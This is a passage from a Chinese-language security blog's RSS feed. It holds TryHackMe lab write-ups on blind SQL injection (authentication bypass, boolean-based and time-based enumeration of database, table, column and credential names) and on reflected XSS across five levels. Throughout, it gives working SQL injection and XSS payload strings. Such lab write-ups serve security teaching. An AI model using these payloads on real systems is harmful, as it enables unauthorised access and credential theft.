	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318164023522_hu_3d6144138148becd.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318164023522_hu_41dbb1a07f48362d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;261&#34;
		data-flex-basis=&#34;627px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;身份认证绕过盲注&#34;&gt;身份认证绕过盲注
&lt;/h3&gt;&lt;p&gt;与带内 SQL 注入不同，我们可以直接在屏幕上看到攻击的结果，而盲 SQLi 是指我们几乎没有收到反馈来确认我们注入的查询是否真的成功，这是因为错误消息已被禁用，但无论如何注入仍然有效。您可能会感到惊讶，我们只需要一点点反馈即可成功枚举整个数据库。&lt;/p&gt;
&lt;p&gt;最直接的盲 SQL 注入技术之一是绕过身份验证方法，例如登录表单。在这种情况下，我们对从数据库中检索数据并不那么感兴趣;我们只想通过登录。&lt;/p&gt;
&lt;p&gt;连接到用户数据库的登录表单的开发方式通常使 Web 应用程序对用户名和密码的内容不感兴趣，而更关心两者是否在 users 表中形成匹配的对。简单来说，Web 应用程序会询问数据库，“您有用户名为 bob 的用户，密码为 bob123 吗？ 数据库回答 Yes 或 No （true/false），并且根据该答案，指示 Web 应用程序是否允许您继续。&lt;/p&gt;
&lt;p&gt;考虑到上述信息，没有必要枚举有效的用户名/密码对。我们只需要创建一个以 yes/true 回复的数据库查询。&lt;/p&gt;
&lt;h4 id=&#34;实际&#34;&gt;实际：
&lt;/h4&gt;&lt;p&gt;SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有 “SQL Query” 的框中看到，对数据库的查询如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;%username%&#39; and password=&#39;%password%&#39; LIMIT 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注意：%username% 和 %password% 值取自登录表单字段。SQL Query （SQL 查询） 框中的初始值将为空，因为这些字段当前为空。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;要将其转换为始终返回 true 的查询，我们可以在 password 字段中输入以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&#39; OR 1=1;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这会将 SQL 查询转换为以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;&#39; and password=&#39;&#39; OR 1=1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为 1=1 是 true 语句，并且我们使用了 &lt;strong&gt;OR&lt;/strong&gt; 运算符，所以这将始终导致查询返回 true，这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318164540872.png&#34;
	width=&#34;704&#34;
	height=&#34;401&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318164540872_hu_f7894b51de964a5b.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318164540872_hu_10e61dff48569835.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;175&#34;
		data-flex-basis=&#34;421px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;基于布尔盲注&#34;&gt;基于布尔盲注
&lt;/h3&gt;&lt;p&gt;基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是 true/false、yes/no、on/off、1/0 或任何只能有两个结果的响应。该结果确认了我们的 SQL Injection payload 成功或失败。在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。&lt;/p&gt;
&lt;h4 id=&#34;实际-1&#34;&gt;实际：
&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318164756211.png&#34;
	width=&#34;714&#34;
	height=&#34;600&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318164756211_hu_253b239a58246ce7.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318164756211_hu_4e3cbd4d8b6b40f0.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;119&#34;
		data-flex-basis=&#34;285px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;览器正文包含 &lt;strong&gt;{“taken”：true}&lt;/strong&gt;。此 API 端点复制了许多订阅表单上的常见功能，该功能检查用户名是否已注册，以提示用户选择不同的用户名。 由于 &lt;strong&gt;taken&lt;/strong&gt; 的值设置为 &lt;strong&gt;true&lt;/strong&gt;，因此我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 &lt;strong&gt;admin&lt;/strong&gt; 更改为 &lt;strong&gt;admin123&lt;/strong&gt; 来确认这一点，按下 Enter 键后，你会看到所采用的值 现在已更改为 false&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username = &#39;%username%&#39; LIMIT 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们唯一可以控制的输入是查询字符串中的用户名，我们必须使用它来执行 SQL 注入。将用户名保持为 &lt;strong&gt;admin123&lt;/strong&gt;，我们可以开始附加到此内容以尝试使数据库确认 true 内容，将 taken 字段的状态从 false 更改为 true。&lt;/p&gt;
&lt;p&gt;与前面的级别一样，我们的第一个任务是建立 users&amp;rsquo; 表中的列数，这可以通过使用 UNION 语句来实现。将 username 值更改为以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1;-- &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于 Web 应用程序已使用取为 false 的值 进行响应，因此我们可以确认这是不正确的列值。 继续添加更多列，直到我们得到 &lt;strong&gt;true&lt;/strong&gt; &lt;strong&gt;的 taken&lt;/strong&gt; 值 。您可以通过将 username 设置为以下值来确认答案为三列：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3;-- &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在我们已经确定了列数，我们可以进行数据库的枚举。我们的第一个任务是发现数据库名称。我们可以通过使用内置的 &lt;strong&gt;database（）&lt;/strong&gt; 方法，然后使用 &lt;strong&gt;like&lt;/strong&gt; 运算符来尝试查找将返回 true 状态的结果。&lt;/p&gt;
&lt;p&gt;尝试以下 username 值，看看会发生什么：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 where database() like &#39;%&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们得到一个 true 响应，因为在 like 运算符中，我们只有 % 的值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%，**您将看到响应返回 false，这确认数据库名称不以字母 &lt;strong&gt;a&lt;/strong&gt; 开头。我们可以循环遍历所有字母、数字和字符，例如 - 和 _，直到找到匹配项。如果您将以下内容作为 username 值发送，您将收到一个 &lt;strong&gt;true&lt;/strong&gt; 响应，确认数据库名称以字母 &lt;strong&gt;s&lt;/strong&gt; 开头&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 where database() like &#39;s%&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318165301765.png&#34;
	width=&#34;713&#34;
	height=&#34;302&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318165301765_hu_9de96fbaf5dca2b4.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318165301765_hu_a26ad05a7d162cfb.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;236&#34;
		data-flex-basis=&#34;566px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;现在，您继续 数据库名称的下一个字符，直到找到另一个真实的响应，例如，&amp;lsquo;sa%&amp;rsquo;、&amp;lsquo;sb%&amp;rsquo;、&amp;lsquo;sc%&amp;rsquo; 等。继续此过程，直到发现数据库名称的所有字符，即 &lt;strong&gt;sqli_three&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318165348478.png&#34;
	width=&#34;712&#34;
	height=&#34;332&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318165348478_hu_56c70d60b176fa67.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318165348478_hu_26b8c9b707aac09a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;214&#34;
		data-flex-basis=&#34;514px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我们已经建立了数据库名称，现在我们可以通过使用 information_schema 数据库使用类似的方法使用它来枚举表名。尝试将 username 设置为以下值：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name like &#39;a%&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此查询在 &lt;strong&gt;tables&lt;/strong&gt; 表中的 information_schema 数据库中 查找数据库名称与 sqli_three 匹配 且表名称以字母 a 开头的结果。 由于上述查询导致 &lt;strong&gt;false&lt;/strong&gt; 响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。和以前一样，您需要在字母、数字和字符之间循环，直到找到正匹配项。&lt;/p&gt;
&lt;p&gt;您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下 username payload 来确认该表：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name=&#39;users&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后，我们现在需要枚举 users 表中的列名 ，以便我们可以正确地搜索登录凭据。 同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询它的列名。使用下面的有效负载，我们搜索 columns 表，其中 database 等于 sqli_three，表名称为 users，列名称以字母 a 开头。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like &#39;a%&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同样， 您需要在字母、数字和字符之间循环，直到找到匹配项。由于您要查找多个结果，因此每次找到新的列名称时，都必须将其添加到有效负载中，以避免发现相同的结果。例如，找到名为 id 的列后，将其附加到原始有效负载中（如下所示）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like &#39;a%&#39; and COLUMN_NAME !=&#39;id&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;重复此过程 3 次，您将发现列的 ID、用户名和密码。现在，您可以使用它来查询 &lt;strong&gt;users&lt;/strong&gt; 表以获取登录凭据。首先，您需要找到一个有效的用户名，您可以使用下面的有效负载：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 from users where username like &#39;a%&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 from users where username=&#39;admin&#39; and password like &#39;a%&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;基于时间的盲注&#34;&gt;基于时间的盲注
&lt;/h3&gt;&lt;p&gt;基于时间的盲目 SQL 注入与上述基于 布尔值的盲注非常相似，因为发送的请求相同，但这次没有明显的查询是错还是对的指示。相反，正确查询的指标基于查询完成所需的时间。此时间延迟是使用内置方法（如 &lt;strong&gt;SLEEP（x）&lt;/strong&gt; 和 UNION 语句引入的。SLEEP（） 方法只会在成功的 UNION SELECT 语句后执行。&lt;/p&gt;
&lt;h4 id=&#34;实际-2&#34;&gt;实际：
&lt;/h4&gt;&lt;p&gt;因此，例如，在尝试建立表中的列数时，您将使用以下查询：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT SLEEP(5);--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果响应时间没有暂停，则我们知道查询不成功，因此与之前的任务一样，我们添加另一列：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT SLEEP(5),2;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有效负载应产生 5 秒的延迟，确认 UNION 语句成功执行，并且有两列。&lt;/p&gt;
&lt;p&gt;按照布尔盲注的步骤，只是更改一下前面的语句，要改成sleep()形式&lt;/p&gt;
&lt;p&gt;最后得到admin：4961&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318171316143.png&#34;
	width=&#34;718&#34;
	height=&#34;751&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318171316143_hu_cb7995221c6c5571.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318171316143_hu_66fc748ecc61b4ac.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;95&#34;
		data-flex-basis=&#34;229px&#34;
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>关于XSS基础的利用</title>
        <link>https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/f11677927824a3d078e08a2c300d8ccf225d496d442a2b7c8be0ca2d5adf6d9a.png" alt="Featured image of post 关于XSS基础的利用" /&gt;&lt;h1 id=&#34;xss-thm-做题记录&#34;&gt;XSS THM 做题记录
&lt;/h1&gt;&lt;h2 id=&#34;level-one&#34;&gt;Level One:
&lt;/h2&gt;&lt;p&gt;看到一个表单，要您输入的姓名，输入姓名后，该表单将在下面的一行中显示，例如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318144957610.png&#34;
	width=&#34;316&#34;
	height=&#34;228&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318144957610_hu_3f5e0d7e9590e393.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318144957610_hu_e780aa757374404d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;138&#34;
		data-flex-basis=&#34;332px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;如果查看 Page Source，将看到姓名反映在代码中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/f371398ba148e07e85b946028e7f6919.png&#34;
	width=&#34;261&#34;
	height=&#34;65&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/f371398ba148e07e85b946028e7f6919_hu_aef9284001d8b5ac.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/f371398ba148e07e85b946028e7f6919_hu_51b6035048d8eaa0.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;401&#34;
		data-flex-basis=&#34;963px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我们将尝试输入以下 JavaScript Payload，而不是输入姓名： &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;现在，当单击输入按钮时，将收到一个带有字符串 &lt;strong&gt;THM&lt;/strong&gt; 的警报弹出窗口，页面源代码将如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145139853.png&#34;
	width=&#34;487&#34;
	height=&#34;80&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145139853_hu_4531f77b934076aa.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145139853_hu_8c8ae7bf91ef05dd.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;608&#34;
		data-flex-basis=&#34;1461px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-two&#34;&gt;Level Two：
&lt;/h2&gt;&lt;p&gt;与上一个级别一样，系统将再次要求您输入的姓名。这一次，当单击 enter 时，姓名将反映在 input 标签中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145218406.png&#34;
	width=&#34;375&#34;
	height=&#34;227&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145218406_hu_9e11e95d99ead5af.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145218406_hu_70288d14c3e501c9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;165&#34;
		data-flex-basis=&#34;396px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;查看页面源，可以看到姓名反映在 input 标签的 value 属性中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145236972.png&#34;
	width=&#34;427&#34;
	height=&#34;79&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145236972_hu_cb602354a661cf98.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145236972_hu_3c1e1118c75ecf05.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;540&#34;
		data-flex-basis=&#34;1297px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;如果要尝试前面的 JavaScript 有效负载，它将不起作用，因为无法从 input 标签内部运行它。相反，我们需要先转义 input 标签，以便 payload 可以正常运行。可以使用以下有效负载执行此作：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有效负载的重要部分是&lt;code&gt;“&amp;gt;&lt;/code&gt;”，它关闭 value 参数，然后关闭 input 标记。&lt;/p&gt;
&lt;p&gt;现在，这会正确关闭 input 标记并允许 JavaScript 有效负载运行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145309755.png&#34;
	width=&#34;670&#34;
	height=&#34;84&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145309755_hu_beccc75d1828ee80.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145309755_hu_5d16b6b425b890fe.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;797&#34;
		data-flex-basis=&#34;1914px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-three&#34;&gt;Level Three:
&lt;/h2&gt;&lt;p&gt;看到另一个表单，询问名字，与上一级一样，名字会反映在 HTML 标签中，这次是 textarea 标签。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145339066.png&#34;
	width=&#34;316&#34;
	height=&#34;250&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145339066_hu_5af4afc671cd80a5.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145339066_hu_72ba392f054a225f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;303px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我们必须使用以下有效负载，以略微不同的方式转义 textarea 标签和输入 1（在 Level Two 中）：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145402800.png&#34;
	width=&#34;477&#34;
	height=&#34;76&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145402800_hu_a0e26319b198c447.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145402800_hu_878d1b1900c1bf43.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;627&#34;
		data-flex-basis=&#34;1506px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145411794.png&#34;
	width=&#34;774&#34;
	height=&#34;85&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145411794_hu_c4ec8df1e260583e.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145411794_hu_fb075b140af2ca33.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;910&#34;
		data-flex-basis=&#34;2185px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;上述有效负载的重要部分是 &lt;code&gt;&amp;lt;/textarea&amp;gt;&lt;/code&gt;，它会导致 textarea 元素关闭，以便脚本运行。&lt;/p&gt;
&lt;h2 id=&#34;level-four&#34;&gt;Level Four:
&lt;/h2&gt;&lt;p&gt;在表单中输入姓名，会在页面上看到它。此级别看起来类似于 1 级，但在检查页面源代码时，会看到名字反映在一些 JavaScript 代码中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145451931.png&#34;
	width=&#34;627&#34;
	height=&#34;78&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145451931_hu_86ebd1dafe5e8f37.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145451931_hu_9c6573fe23e9a73.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;803&#34;
		data-flex-basis=&#34;1929px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;必须转义现有的 JavaScript 命令，以便能够运行代码;可以使用以下有效负载 &lt;code&gt;&#39;;alert（&#39;THM&#39;）;//&lt;/code&gt; 从下面的屏幕截图中可以看到，它将执行代码。&lt;code&gt;&#39;&lt;/code&gt; 关闭指定名称的字段，然后 &lt;code&gt;;&lt;/code&gt;表示当前命令的结束，末尾的 则``使它后面的任何内容成为注释，而不是可执行代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145515388.png&#34;
	width=&#34;726&#34;
	height=&#34;82&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145515388_hu_3d498d5a8d887b99.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145515388_hu_928796f51fd9e8b4.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;885&#34;
		data-flex-basis=&#34;2124px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-five&#34;&gt;Level Five:
&lt;/h2&gt;&lt;p&gt;现在，此级别看起来与级别 1 相同，并且名字也会反映在同一个位置。但是，如果尝试有效负载 &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt; ，它将不起作用。当查看页面源代码时，将了解原因。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145543128.png&#34;
	width=&#34;407&#34;
	height=&#34;81&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145543128_hu_88e2fa256b61ebde.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145543128_hu_cefdf50d144b9c64.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
